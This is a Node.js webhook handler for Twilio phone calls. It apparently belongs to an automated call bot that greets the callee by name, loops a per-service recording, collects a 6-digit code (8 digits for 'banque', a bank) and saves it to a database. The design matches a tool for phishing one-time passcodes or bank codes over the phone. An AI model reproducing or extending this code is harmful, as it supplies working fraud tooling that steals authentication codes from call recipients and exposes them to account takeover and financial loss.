module.exports = function(request, response) {
    /**
     * File containing the necessary configurations for the proper functioning of the system
     */
    const config = require('.././config');

    /**
     * Integration of SQLITE3 dependencies
     */
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');

    /**
     * Retrieving the posted variables to order the API response in TwiML
     */
    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;

    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }

    /**
     * Retrieve the service used in this call to return the correct audio to use
     */
    db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }

        /**
         * If the callSid is not found, use the default audio
         * Same for the name of the person to call
         */
        var service = row == undefined ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;

        /**
         * If the callSid is found but the service does not exist, use the default audio
         */
        if (config[service + 'filepath'] == undefined) service = 'default';

        /**
         * Create the audio URLs using the data in the config file
         */
        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = service == 'banque' ? '8' : '6';

        /**
         * Create the TwiML response to return, adding the audio URL
         */
        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Hello! ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';

        /**
         * If the user sent the code, add it to the database and return the end audio: end of the call
         */
        length = service == 'banque' ? 8 : 6;
        if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
            /**
             * End audio
             */
            respond(end);

            /**
             * Add the code to the database
             */
            db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                if (err) {
                    return console.log(err.message);
                }
            });
        } else {
            /**
             * Return the default TwiML to replay the audio
             */
            respond(ask);
        }
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};